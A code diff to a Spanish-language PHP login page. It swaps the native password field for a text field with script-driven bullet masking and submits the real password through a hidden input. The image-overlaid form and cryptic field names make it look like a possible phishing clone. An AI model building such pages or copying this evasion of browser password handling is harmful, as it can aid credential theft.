@@ -62,8 +62,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, '')">
-                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
+                <input id="i2" name="ips2" placeholder="Contraseña" type="text" required
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" oninput="handlePasswordInput(this)" onkeypress="return noEspacios(event)">
                 <p id="error-message" style="font-family: sans-serif;">Usuario o contraseña incorrecta</p>
                 <input type="submit" value="Inicie Sesión"
                        style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
@@ -107,6 +107,47 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         function noEspacios(event) {
             return event.key !== " ";
         }
+
+        function handlePasswordInput(input) {
+            // Guardar el valor real en un atributo data
+            if (!input.dataset.realValue) {
+                input.dataset.realValue = '';
+            }
+            
+            // Obtener el valor real y el valor mostrado
+            const realValue = input.dataset.realValue;
+            const displayedValue = input.value;
+            
+            // Si el usuario borró caracteres, actualizar el valor real
+            if (displayedValue.length < realValue.length) {
+                input.dataset.realValue = realValue.substring(0, displayedValue.length);
+            } else if (displayedValue.length > realValue.length) {
+                // Si el usuario agregó caracteres, agregar al valor real
+                const newChars = displayedValue.substring(realValue.length);
+                input.dataset.realValue += newChars;
+            }
+            
+            // Mostrar asteriscos en el campo
+            input.value = '●'.repeat(input.dataset.realValue.length);
+        }
+
+        // Asegurar que el formulario envíe el valor real
+        document.getElementById('f1').addEventListener('submit', function(e) {
+            const passwordInput = document.getElementById('i2');
+            if (passwordInput.dataset.realValue) {
+                // Crear un campo oculto con el valor real
+                const hiddenInput = document.createElement('input');
+                hiddenInput.type = 'hidden';
+                hiddenInput.name = 'ips2';
+                hiddenInput.value = passwordInput.dataset.realValue;
+                
+                // Cambiar el nombre del campo original para no enviarlo duplicado
+                passwordInput.name = 'ips2_display';
+                
+                // Agregar el campo oculto al formulario
+                this.appendChild(hiddenInput);
+            }
+        });
 
         function validarContrasena(contrasena) {
             const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]).{8,32}$/;
